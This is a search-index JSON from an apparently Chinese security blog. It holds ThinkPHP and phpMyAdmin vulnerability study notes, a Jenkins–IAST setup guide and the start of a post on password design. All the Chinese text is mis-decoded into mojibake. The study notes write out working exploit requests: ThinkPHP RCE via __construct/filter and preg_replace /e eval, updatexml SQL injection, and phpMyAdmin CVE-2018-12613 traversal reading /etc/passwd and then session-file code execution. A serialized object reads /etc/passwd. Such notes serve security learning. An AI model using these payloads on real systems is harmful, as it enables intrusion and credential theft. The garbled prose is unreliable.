è·å– HTTP è¯·æ±‚ç±»å‹æ—¶æ²¡æœ‰è¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå‚æ•°ä¸º POST çš„æ•°æ®ã€‚å› æ­¤å¯ä»¥è°ƒç”¨ Request ç±»çš„æ„é€ å‡½æ•°ï¼Œè¦†ç›–å…¶æˆå‘˜å±æ€§ method, filter, getï¼Œæœ€ç»ˆè°ƒç”¨ call_user_func å®ç° RCEã€‚ POST /?s=captcha HTTP/1.1 ... _method=__construct\u0026filter[]=printf\u0026method=get\u0026get[]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 POST /?s=captcha HTTP/1.1 ... _method=__construct\u0026filter[]=printf\u0026method=get\u0026server[REQUEST_METHOD]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 å›¾ 2 \" å›¾ 2 ","date":"2020-07-29","objectID":"/think-php-myadmin/:2:0","tags":["PHP"],"title":"ThinkPHP \u0026 phpMyAdmin æ¼æ´å­¦ä¹ ","uri":"/think-php-myadmin/"},{"categories":["Web å®‰å…¨"],"content":"ThinkPHP 2.x RCE å‚è€ƒ preg_replace çš„ /e æ¨¡å¼å…è®¸ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¢«æ‰§è¡Œï¼Œé€ æˆ RCEã€‚ POST /?s=1/2/3/${eval($_POST[merc])} HTTP/1.1 ... merc=printf(b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327); å›¾ 3 \" å›¾ 3 ThinkPHP 3.0 Lite æ¨¡å¼ä¸‹åŒæ ·å­˜åœ¨æ¼æ´ã€‚ ","date":"2020-07-29","objectID":"/think-php-myadmin/:3:0","tags":["PHP"],"title":"ThinkPHP \u0026 phpMyAdmin æ¼æ´å­¦ä¹ ","uri":"/think-php-myadmin/"},{"categories":["Web å®‰å…¨"],"content":"ThinkPHP 5.x SQL æ³¨å…¥å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ² å‚è€ƒ PDO æŸ¥è¯¢æ—¶å¦‚æœåœ¨æŸ¥è¯¢æ¡ä»¶ä¸­é‡åˆ°äº† in ï¼Œå°±ä¼šéå†ä¼ å…¥æ•°ç»„ ids çš„ key å’Œ valueï¼Œè€Œå‰è€…åœ¨é¢„ç¼–è¯‘æ—¶å¹¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥å¯¼è‡´é¢„ç¼–è¯‘ç»“æœå‡ºé”™ã€‚åœ¨ debug æ¨¡å¼å¼€å¯æ—¶ï¼ˆé»˜è®¤ï¼‰ï¼Œæ­¤æ—¶çš„æŠ¥é”™ä¼šæ³„éœ²æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç ã€‚ /index.php?ids[1,updatexml(1,concat(0x7e,md5(1),0x7e),1)]=1 å›¾ 4 \" å›¾ 4 ","date":"2020-07-29","objectID":"/think-php-myadmin/:4:0","tags":["PHP"],"title":"ThinkPHP \u0026 phpMyAdmin æ¼æ´å­¦ä¹ ","uri":"/think-php-myadmin/"},{"categories":["Web å®‰å…¨"],"content":"phpMyAdmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å« CVE-2018-12613 å‚è€ƒ ä»£ç ä¸­å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œåªéœ€è¦ç»•è¿‡æ¡ä»¶åˆ¤æ–­ä¸­çš„ç™½åå•ã€‚åˆ¤æ–­å‡½æ•°åˆ©ç”¨ ? æˆªæ–­ GET å‚æ•°ï¼Œå¹¶ä¸”è¿˜ä¼šè¿›è¡Œ URL è§£ç ï¼Œå› æ­¤åˆ©ç”¨äºŒæ¬¡ URL ç¼–ç  %253f å³å¯ç»•è¿‡ç™½åå•ï¼ŒåŒæ—¶è¯»å–ä»»æ„æ–‡ä»¶ã€‚ /index.php?target=db_sql.php%253f/../../../../etc/passwd å›¾ 5 \" å›¾ 5 éšåï¼Œæ‰§è¡Œ select \u003c?=phpinfo()?\u003e;ï¼ŒæŠ“åŒ…è·å–å½“å‰ sessionï¼Œéšåè®¿é—® session æ–‡ä»¶å³å¯æ‰§è¡Œå¯¹åº” php ä»£ç ï¼š /index.php?target=db_sql.php%253f/../../../../tmp/sess_1ee714d1373e5caad9faf122e9ad1798 å›¾ 6 \" å›¾ 6 ","date":"2020-07-29","objectID":"/think-php-myadmin/:5:0","tags":["PHP"],"title":"ThinkPHP \u0026 phpMyAdmin æ¼æ´å­¦ä¹ ","uri":"/think-php-myadmin/"},{"categories":["Web å®‰å…¨"],"content":"phpMyAdmin 4.0.x-4.6.2 è®¤è¯ç”¨æˆ· RCE CVE-2016-5734 å®é™…å½±å“ç‰ˆæœ¬ï¼š 4.0.x \u003c 4.0.10.16 4.4.x \u003c 4.4.15.7 4.6.x \u003c 4.6.3 å‚è€ƒ è¿™ä¸ªé—®é¢˜å®é™…ä¸Šæ˜¯ PHP 5.4.7 çš„ preg_replace å‡½æ•°çš„é—®é¢˜ã€‚å½“ä½¿ç”¨ç±»ä¼¼å¦‚ä¸‹ä»£ç æ—¶ï¼š preg_replace('/'.$user_input.'/i', $replace, $text); æˆ‘ä»¬å¯ä»¥è¾“å…¥ /e\\0 æ¥æ³¨å…¥ /e ä¿®é¥°ç¬¦ï¼ŒåŒæ—¶æˆªæ–­åé¢çš„å†…å®¹æ¥è¾¾æˆ RCEã€‚ åœ¨ phpMyAdmin ä¸­åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œéœ€è¦çŸ¥é“ç³»ç»Ÿçš„ç”¨æˆ·åå¯†ç ï¼šexp å›¾ 7 \" å›¾ 7 ","date":"2020-07-29","objectID":"/think-php-myadmin/:6:0","tags":["PHP"],"title":"ThinkPHP \u0026 phpMyAdmin æ¼æ´å­¦ä¹ ","uri":"/think-php-myadmin/"},{"categories":["Web å®‰å…¨"],"content":"phpMyAdmin 2.x setup.php ååºåˆ—åŒ– å‚è€ƒ åœ¨ /scripts/setup.php ä¸­æ²¡æœ‰å¯¹ configuration å‚æ•°è¿›è¡Œè¿‡æ»¤å°±è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œå› æ­¤å¯ä»¥æ³¨å…¥ä¸€ä¸ª PMA_Config å¯¹è±¡ï¼Œåœ¨æ„é€ å‡½æ•°ä¸­å¼•å…¥å…¶æˆå‘˜å˜é‡ source å¹¶é€šè¿‡ eval æ‰§è¡Œã€‚æ—¢å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å·²æœ‰æ–‡ä»¶æ‰§è¡Œä»£ç ã€‚ ä»¥è¯»å– /etc/passwd ä¸ºä¾‹ï¼š \u003c?php class PMA_Config { public $source = \"/etc/passwd\"; } $data = new PMA_Config(); echo serialize($data); ?\u003e è¿è¡Œå¯ä»¥å¾—åˆ°ï¼š O:10:\"PMA_Config\":1:{s:6:\"source\";s:11:\"/etc/passwd\";} å›¾ 8 \" å›¾ 8 ä¹‹åå¯ä»¥è¿›ä¸€æ­¥é€šè¿‡ ftp åè®®å†™ shellã€‚ ","date":"2020-07-29","objectID":"/think-php-myadmin/:7:0","tags":["PHP"],"title":"ThinkPHP \u0026 phpMyAdmin æ¼æ´å­¦ä¹ ","uri":"/think-php-myadmin/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"å·¥ä½œä¸­å†™çš„ä¸€ä»½æŒ‡å—æ–‡æ¡£ã€‚ç”±äºç”¨çš„æ˜¯æµ‹è¯•ç¯å¢ƒï¼Œå¹¶æ²¡æœ‰éœ€è¦è„±æ•çš„åœ°æ–¹ã€‚ ","date":"2020-07-28","objectID":"/jenkins-iast/:0:0","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"ç¯å¢ƒå‡†å¤‡ ä¹‹å‰ XXXï¼ˆåŒäº‹åï¼‰å·²ç»æŒ‰ç…§ DevSecOps Studio ä¸­çš„è¯´æ˜æ­å»ºå¥½äº† DevSecOps çš„åŸºæœ¬ç¯å¢ƒï¼Œå¯ä»¥ä»ä»–é‚£é‡Œæ‹·è´ä¸€ä»½ã€‚ç”±äºæˆ‘ä»¬æ¼”ç¤ºæ—¶åªéœ€è¦ç”¨åˆ° GitLab å’Œ Jenkins ä¸¤ä¸ªè™šæ‹Ÿæœºï¼Œå…¶å®ƒçš„å¯ä»¥ä¸ç”¨æ‹·è´ã€‚å¤§å°åœ¨ 11G å·¦å³ã€‚ æ‹·è´å®Œæˆåï¼Œç›®å½•ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š å›¾ 1 \" å›¾ 1 è¿™é‡Œçš„ 2200 , 2201 æ˜¯é…ç½®ç«¯å£è½¬å‘åï¼Œä¸¤ä¸ªè™šæ‹Ÿæœºçš„ ssh æœåŠ¡åœ¨æœ¬æœºä¸Šçš„å¯¹åº”ç«¯å£ï¼Œå¯ä»¥ä¸ç”¨æ›´æ”¹ã€‚ ","date":"2020-07-28","objectID":"/jenkins-iast/:1:0","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"åˆ›å»ºè™šæ‹Ÿæœº è¿™ä¸€éƒ¨åˆ†çš„æ“ä½œå¯¹ GitLab å’Œ Jenkins éƒ½éœ€è¦åšã€‚ åœ¨åˆ›å»ºè™šæ‹Ÿæœºå‰éœ€è¦å…ˆä¿®æ”¹ .vbox æ–‡ä»¶çš„é…ç½®ï¼Œç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ .vbox æ–‡ä»¶ï¼Œæœç´¢ \\Users\\neoo\\gitool\\ï¼Œæ›¿æ¢ä¸ºä½ ç”µè„‘ä¸Šå­˜æ”¾ DevSecOps-Studio çš„ç›®å½•ï¼ˆç»å¯¹è·¯å¾„ï¼‰ã€‚ä¾‹å¦‚æˆ‘çš„ç”µè„‘ä¸Šæ˜¯ï¼š å›¾ 2 \" å›¾ 2 å®é™…ä¸Šï¼Œåªéœ€è¦ä¿è¯æ–‡ä»¶ ubuntu-xenial-16.04-cloudimg-console.log å’Œ gitlab-2201 æ–‡ä»¶å¤¹å¤„äºåŒä¸€ç›®å½•ä¸‹ã€‚ éšåæ‰“å¼€ VirtualBox ï¼Œç‚¹å‡» å·¥å…· -\u003e æ³¨å†Œ å¹¶é€‰æ‹©å¯¹åº”çš„ .vbox æ–‡ä»¶ï¼Œå³å¯å¯¼å…¥ä¸¤ä¸ªè™šæ‹Ÿæœºï¼š å›¾ 3 \" å›¾ 3 ","date":"2020-07-28","objectID":"/jenkins-iast/:1:1","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"é…ç½®è™šæ‹Ÿæœº sshï¼ˆå¯é€‰ï¼‰ è¿™ä¸€éƒ¨åˆ†çš„æ“ä½œä¸æ˜¯å¿…éœ€çš„ã€‚ è¿›å…¥è™šæ‹Ÿæœºè®¾ç½®ç•Œé¢ï¼Œç‚¹å‡» ç½‘ç»œ -\u003e é«˜çº§ -\u003e ç«¯å£è½¬å‘ ï¼Œå°±å¯ä»¥å°†è™šæ‹Ÿæœºçš„ ssh ç«¯å£æ˜ å°„åˆ°æœ¬æœºã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œæ­¤æ—¶å·²ç»æ˜ å°„åˆ°äº† 2200/2201 ç«¯å£ã€‚ å›¾ 4 \" å›¾ 4 æ¥ä¸‹æ¥ï¼Œéœ€è¦å¯åŠ¨è™šæ‹Ÿæœºï¼Œç”¨ vagrant/vagrant ç™»å½•ï¼Œå¹¶è¿è¡Œï¼š sudo vim /etc/ssh/sshd_config å°† 52 è¡Œæ”¹ä¸ºï¼š PasswordAuthentication yes æœ€åè¿è¡Œï¼š sudo service sshd restart è¿™æ ·å°±å¯ä»¥é€šè¿‡æœ¬æœºçš„ ssh å®¢æˆ·ç«¯è¿æ¥è™šæ‹Ÿæœºäº†ï¼š å›¾ 5 \" å›¾ 5 ","date":"2020-07-28","objectID":"/jenkins-iast/:1:2","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"ç½‘ç»œé…ç½® é»˜è®¤æƒ…å†µä¸‹ï¼ŒJenkins å’Œ GitLab éƒ½é‡‡ç”¨ NAT æ¨¡å¼ï¼Œæ­¤æ—¶æˆ‘ä»¬æœ¬æœºæ˜¯æ— æ³• ping é€šè™šæ‹Ÿæœºçš„ã€‚ä¸ºäº†åç»­æ“ä½œæ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥å°† GitLab è®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼ï¼Œå³åœ¨ ç½‘ç»œ -\u003e è¿æ¥æ–¹å¼ ä¸­é€‰æ‹©æ¡¥æ¥ç½‘å¡ã€‚ æ­¤æ—¶å†å¯åŠ¨ GitLabï¼Œç”¨ vagrant/vagrant ç™»å½•ï¼Œå¹¶è¿è¡Œ ifconfig | more ï¼Œå¯ä»¥çœ‹åˆ°æ¡¥æ¥æ¨¡å¼ä¸‹çš„ IP åœ°å€ï¼Œè¿™ä¸ªåœ°å€å¯¹æˆ‘ä»¬æœ¬æœºè€Œè¨€æ˜¯å¯è¾¾çš„ã€‚ å›¾ 6 \" å›¾ 6 å¦‚å›¾æ‰€ç¤ºï¼ŒGitLab è™šæ‹Ÿæœºçš„ IP ä¸º 192.168.0.109ã€‚ æ¡¥æ¥æ¨¡å¼ä¸‹å°±ä¸éœ€è¦ç«¯å£è½¬å‘äº†ã€‚æ­¤æ—¶ ssh è¿æ¥çš„ç›®æ ‡ä¹Ÿå˜æˆ 192.168.0.109:22ã€‚ ç”±äº GitLab çš„æœåŠ¡è¿è¡Œåœ¨ 443 ç«¯å£ï¼Œæ­¤æ—¶ç›´æ¥è®¿é—® https://192.168.0.109 æ˜¯å¯ä»¥çœ‹åˆ° GitLab ç•Œé¢çš„ã€‚å½“ç„¶ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯å¦‚ä¸‹ç•Œé¢ï¼š å›¾ 7 \" å›¾ 7 è¿™ç§æƒ…å†µä¸‹ä¸€èˆ¬åªéœ€è¦å¤šç­‰å¾…ä¸€ä¼šå„¿å°±å¥½äº†ã€‚ ä¹‹æ‰€ä»¥é‡‡ç”¨æ¡¥æ¥æ¨¡å¼ï¼Œæ˜¯ä¸ºäº†é…åˆè§£æ GitLab å†…ç½®çš„åŸŸå gitlab.localã€‚ç°åœ¨åªéœ€è¦ä¿®æ”¹æœ¬æœº hosts æ–‡ä»¶ï¼Œè®© gitlab.local è§£æåˆ° 192.168.0.109 å³å¯ã€‚ å›¾ 8 \" å›¾ 8 è®¿é—® https://gitlab.localï¼Œåº”è¯¥èƒ½å¾—åˆ°æ­£å¸¸çš„ GitLab ç™»å½•é¡µé¢äº†ã€‚ é»˜è®¤æƒ…å†µä¸‹ Jenkins è™šæ‹Ÿæœºåº”è¯¥èƒ½å¤Ÿè§£æ gitlab.local åŸŸåï¼Œå¦‚æœåé¢è®¾ç½® Jenkins æ—¶é‡åˆ°åŸŸåè§£æé—®é¢˜ï¼Œè¯·æ£€æŸ¥ Jenkins è™šæ‹Ÿæœºçš„ /etc/hosts æ–‡ä»¶ã€‚ å¦‚æœéœ€è¦ä¿¡ä»» GitLab çš„è‡ªç­¾åè¯ä¹¦ï¼Œå¯ä»¥å…ˆ cd /etc/gitlab \u0026\u0026 sudo mv ssl/* ./ï¼Œç„¶åå°† gitlab.local.crt é€šè¿‡ SFTP ä¸‹è½½åˆ°æœ¬æœºå¹¶å¯¼å…¥åˆ°å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„é‡Œã€‚ ","date":"2020-07-28","objectID":"/jenkins-iast/:1:3","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"GitLab é…ç½® æ³¨å†Œè´¦å·ã€ç™»å½•ã€åˆ›å»ºæ–°çš„å…¬å¼€ repoã€‚åœ¨æœ¬åœ°å‡†å¤‡ä¸€ä¸ª Java Web åº”ç”¨ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ java-sec-code è¿™ä¸ªé¡¹ç›®ã€‚ å¦‚æœä½¿ç”¨å…¶å®ƒé¡¹ç›®ï¼Œè¯·ç¡®ä¿å¯ä»¥åœ¨ Java 6/7/8 ä¸­çš„è‡³å°‘ä¸€ä¸ªè¿è¡Œç¯å¢ƒä¸Šè¿è¡Œã€‚åŸå› ï¼š å›¾ 9 \" å›¾ 9 éšååˆ é™¤åŸé¡¹ç›®ç›®å½•ä¸‹ .git ç›®å½•ï¼ˆå¦‚æœä½ å¯¹ git æ¯”è¾ƒç†Ÿæ‚‰ä¹Ÿå¯ä»¥ä¸åˆ é™¤ï¼‰ï¼Œè¿è¡Œï¼ˆé¡¹ç›®åéœ€è‡ªè¡Œæ›¿æ¢ï¼‰ï¼š cd java-sec-code git init git remote add origin https://GitLab.local/merc/java-sec-code.git git add . git commit -m \"Initial commit\" git push -u origin master å³å¯å°†é¡¹ç›®æ¨é€åˆ° GitLab ä¸Šã€‚æœŸé—´é‡åˆ°çš„é—®é¢˜è¯·å‚è€ƒ Git æ–‡æ¡£ã€‚ ","date":"2020-07-28","objectID":"/jenkins-iast/:2:0","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"Jenkins é…ç½® é¦–å…ˆé…ç½®ç«¯å£è½¬å‘ï¼Œå°†è™šæ‹Ÿæœº 8080 ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„ä»»æ„æœªå ç”¨ç«¯å£ï¼Œå¦‚ 8008ï¼š å›¾ 10 \" å›¾ 10 ç„¶åè®¿é—® http://localhost:8008/ ï¼Œå³å¯çœ‹åˆ° Jenkins é¡µé¢ã€‚ æ¥ä¸‹æ¥ï¼ŒæŒ‰ç…§ é›³é‰´ IAST ç¬¬ä¸‰æ–¹æ’ä»¶å¸®åŠ©æ–‡æ¡£ ä¸€æ­¥æ­¥é…ç½® Jenkinsã€‚éœ€è¦æ³¨æ„çš„å‡ ç‚¹ï¼š é›³é‰´ä¸­æä¾›çš„ Jenkins æ’ä»¶å¯èƒ½å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ï¼Œè¯·åŠ¡å¿…ä½¿ç”¨ä¿®æ”¹åçš„ IAST.hpi æ–‡ä»¶ä»£æ›¿ã€‚ ç¬¬äºŒæ­¥ä¸­ IAST æœåŠ¡å™¨åœ°å€ è¯·å¡«å†™å…¬ç½‘é›³é‰´åœ°å€ï¼Œå³ http://47.100.14.22:81/ã€‚ ç¬¬ä¸‰æ­¥ç»“æŸåï¼Œå…ˆå¦‚å›¾é…ç½®å¥½ repo åœ°å€ï¼ˆé¡¹ç›®åéœ€è‡ªè¡Œæ›¿æ¢ï¼‰ï¼š å›¾ 11 \" å›¾ 11 ç¬¬å››æ­¥ä¸­ è¢«æµ‹ç«™ç‚¹åœ°å€ å³éƒ¨ç½² Java Web åº”ç”¨çš„æœåŠ¡å™¨åœ°å€ï¼Œå½¢å¼ä¸€èˆ¬æ˜¯ ip:portã€‚ åœ¨ç¬¬äº”æ­¥å‰ï¼Œè¯·å…ˆåœ¨æœåŠ¡å™¨ä¸Šéƒ¨ç½²å¥½ Java Web åº”ç”¨å¹¶è¿è¡Œï¼Œé˜²æ­¢é›³é‰´ä¸­é¡¹ç›®åˆ›å»ºå¤±è´¥ã€‚ä¾‹å¦‚æˆ‘çš„åº”ç”¨æ˜¯åŸºäº Springboot çš„ï¼Œåªéœ€è¦è¿è¡Œ java -jar java-sec-code-1.0.0.jar å³å¯ã€‚ åœ¨æ„å»ºå®Œæˆåï¼Œé¢„æœŸç»“æœæ˜¯åœ¨é›³é‰´ä¸­åˆ›å»ºäº†æ–°çš„é¡¹ç›®ã€‚ä½†æ˜¯æ‰«æç»“æœä¸­æ˜¯æ²¡æœ‰æ¼æ´çš„ï¼Œå› ä¸ºè¿˜æ²¡æœ‰è¿›è¡Œæ’æ¡©ï¼š å›¾ 12 \" å›¾ 12 ","date":"2020-07-28","objectID":"/jenkins-iast/:3:0","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"è¿›è¡Œæ’æ¡©æ‰«æ è¿›å…¥æ–°åˆ›å»ºçš„é¡¹ç›®è¯¦æƒ…é¡µé¢ä¸‹è½½ agentï¼Œç„¶å SFTP ä¼ åˆ°æœåŠ¡å™¨ä¸Šã€‚æ ¹æ® é›³é‰´ IAST æ’æ¡© agent å¸®åŠ©æ–‡æ¡£æ¥éƒ¨ç½² agentã€‚ä¾‹å¦‚å¯¹äºæˆ‘çš„ Springboot åº”ç”¨ï¼Œåªéœ€è¦è¿è¡Œï¼š java -javaagent:./iast_agent.jar -jar java-sec-code-1.0.0.jar å¾…é¡¹ç›®å¯åŠ¨åï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—® Java Web åº”ç”¨ï¼Œå³å¯åœ¨é¡¹ç›®è¯¦æƒ…é¡µé¢çœ‹åˆ°å·²ç»å¯åŠ¨çš„ agent äº†ã€‚ å›¾ 13 \" å›¾ 13 æ’æ¡©æ‰«ææ˜¯åŸºäºæµé‡çš„ï¼Œå› æ­¤åªæœ‰å‘é€è¯·æ±‚åæ‰èƒ½æ£€æµ‹åˆ° agentã€‚ æ¥ä¸‹æ¥å¯¹è¦æµ‹è¯•çš„åŠŸèƒ½ç‚¹å‘é€è¯·æ±‚å³å¯è¿›è¡Œæ‰«æã€‚ä¾‹å¦‚å¯¹äºå­˜åœ¨ SSRF æ¼æ´çš„åŠŸèƒ½ç‚¹å‘èµ·è¯·æ±‚ï¼š å›¾ 14 \" å›¾ 14 åœ¨é›³é‰´ç•Œé¢ä¸­å¯ä»¥çœ‹åˆ°ï¼š å›¾ 15 \" å›¾ 15 è¿™æ—¶å›åˆ° Jenkins å†æ¬¡è¿›è¡Œæ„å»ºï¼Œå°±å¯ä»¥å¾—åˆ°æ­£ç¡®çš„æ‰«æç»“æœäº†ï¼š å›¾ 16 \" å›¾ 16 ","date":"2020-07-28","objectID":"/jenkins-iast/:4:0","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"é™„å½• å†…ç½‘ï¼ˆä»…ä¸»æœºç½‘ç»œä¸‹ï¼‰ IPï¼š Jenkinsï¼š10.0.1.11 GitLabï¼š 10.0.1.15 ç›¸å…³ç›®å½•ï¼š Jenkinsï¼š/var/lib/jenkinsï¼Œé¡¹ç›®ç›®å½•ä½äº jobs ä¸‹ GitLabï¼š/etc/gitlabï¼Œé…ç½®æ–‡ä»¶ä¸º gitlab.rb åœ¨ Jenkins ä¸­åˆ é™¤ä¸€ä¸ªé¡¹ç›®åï¼Œé‡æ–°åˆ›å»ºæ–°é¡¹ç›®å‰å»ºè®®è¿è¡Œ rm -rf /var/lib/jenkins/jobs/jobs ","date":"2020-07-28","objectID":"/jenkins-iast/:5:0","tags":["CI/CD"],"title":"ç¨³ä¸­æ±‚è¿›ï¼šJenkins é›†æˆ IAST å…¨æµç¨‹","uri":"/jenkins-iast/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å°±ç®—æ— æ³•é€ƒé¿ç¤¾å·¥ï¼Œä¹Ÿè¦è®¾æ³•å‡å°‘æŸå¤±ã€‚ æœ€è¿‘åˆå¿ƒè¡€æ¥æ½®æŠŠæ‰€æœ‰é‡è¦è´¦å·çš„å¯†ç æ”¹äº†ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­äº§ç”Ÿäº†å¾ˆå¤šæƒ³æ³•ï¼Œè®°å½•ä¸€ä¸‹ã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:0:0","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å¸¸è¯† æˆ‘ä»¬çŸ¥é“ï¼Œå°½ç®¡æ‰«ç ç™»å½•ã€æ‰‹æœºéªŒè¯ç ç™»å½•å·²ç»ååˆ†æ™®åŠï¼Œä¼ ç»Ÿçš„è´¦å· + å¯†ç ä¾ç„¶æ˜¯ä¸»æµçš„ç™»é™†æ–¹å¼ã€‚ä¸ºäº†é¿å…å’Œå¯†ç å­¦æœ¯è¯­æ··æ·†ï¼Œè¿™é‡Œè¯´çš„ â€œå¯†ç â€ å®é™…ä¸ŠæŒ‡çš„æ˜¯â€œå£ä»¤â€ã€‚å¦‚ä»Šåº”è¯¥ä¸ä¼šå†æœ‰äººç”¨ç±»ä¼¼ 123456 è¿™æ ·çš„å£ä»¤äº†ï¼Œç„¶è€Œåœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°è®¸å¤šç”¨æˆ·ã€ä¹ƒè‡³è®¸å¤šç³»ç»Ÿçš„å£ä»¤ä¾ç„¶åªæ˜¯åšåˆ°äº†æ¯” 123456 å¼ºä¸€äº›è€Œå·²ã€‚å› æ­¤ï¼Œå…³äºå£ä»¤çš„è®¾ç½®ï¼Œé¦–å…ˆéœ€è¦æ˜ç¡®ä¸€äº›å¸¸è¯†ã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:1:0","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"æ”»å‡» ç«™åœ¨æ”»å‡»è€…è§’åº¦ï¼Œå¦‚æœä»–æƒ³è¦çªƒå–ä½ çš„å£ä»¤ï¼Œä¸€èˆ¬ä¼šå¦‚ä½•ä¸‹æ‰‹å‘¢ï¼Ÿæœ€å¸¸è§çš„æ–¹æ³•ä¸å¤–ä¹æš´åŠ›ç ´è§£å’Œå­—å…¸æ”»å‡»ä¸¤ç§ã€‚ æš´åŠ›ç ´è§£ å¦‚æœæ”»å‡»è€…å·²ç»çŸ¥é“ä½ çš„å£ä»¤æ˜¯ 6 ä½çº¯æ•°å­—ï¼Œé‚£ä¹ˆä»–çš„æ€è·¯å°±éå¸¸ç®€å•ï¼šä» 000000 åˆ° 999999 é€ä¸€å°è¯•ç›´åˆ°æˆåŠŸä¸ºæ­¢ï¼›å¦‚æœæ˜¯ 6 ä¸ªå­—æ¯ç»„æˆçš„å•è¯ï¼Œé‚£å°±æšä¸¾æ¯ä¸€ä½ä¸Šçš„ 26ï¼ˆ52ï¼‰ç§å¯èƒ½æ€§ã€‚åªè¦æ—¶é—´å¤Ÿé•¿ï¼Œè¿™ç§æ–¹æ³•æ€»èƒ½æˆåŠŸï¼Œç„¶è€Œé—®é¢˜åœ¨äºå½“å£ä»¤çš„é•¿åº¦å’Œå­—ç¬¦é›†å¢é•¿æ—¶ï¼Œæš´åŠ›ç ´è§£æ‰€éœ€è¦çš„æ—¶é—´ä»£ä»·ä¹Ÿé£é€Ÿå¢é•¿ï¼Œä½¿å¾—è¿™ç§æ–¹æ³•åœ¨å¤§éƒ¨åˆ†åœºæ™¯ä¸‹æ²¡æœ‰ä»€ä¹ˆå®ç”¨ä»·å€¼ã€‚ä¸ºäº†ç¼©å°æšä¸¾çš„ç©ºé—´ï¼Œæ”»å‡»è€…å¸¸å¸¸é€‰æ‹©å¦ä¸€ç§æ‰‹æ®µç±»ä¼¼çš„æ–¹æ³•ï¼šå­—å…¸æ”»å‡»ã€‚ å­—å…¸æ”»å‡» å‡è®¾ä½ çš„å£ä»¤æ˜¯ä¸Šé¢è¯´çš„ 6 ä¸ªå­—æ¯ç»„æˆçš„å•è¯ï¼Œæ”»å‡»è€…å¯ä»¥é æŸ¥å­—å…¸æ¥å¤§å¤§ç¼©å°éœ€è¦æšä¸¾çš„èŒƒå›´â€”â€”â€”â€”æ¯•ç«Ÿï¼Œè®¸å¤š 6 å­—æ¯ç»„åˆå¹¶ä¸èƒ½æ„æˆå•è¯ã€‚å½“ç„¶ï¼Œè¿™ä¹ˆè¯´æ˜¯ä¸€ç§ç®€åŒ–çš„æƒ…å†µã€‚å®é™…åœºæ™¯ä¸‹çš„å­—å…¸æ”»å‡»ï¼Œæ˜¯æ”»å‡»è€…å…ˆå‡†å¤‡ä¸€æœ¬ â€œå£ä»¤å­—å…¸â€ï¼Œç„¶ååªæšä¸¾åœ¨è¿™æœ¬å­—å…¸ä¸Šå‡ºç°è¿‡çš„é‚£äº›å£ä»¤ã€‚é—®é¢˜åœ¨äºæ”»å‡»è€…å¦‚ä½•åˆ¶å®šè¿™æœ¬å­—å…¸æ¥æå‡æˆåŠŸç‡çš„ã€‚ 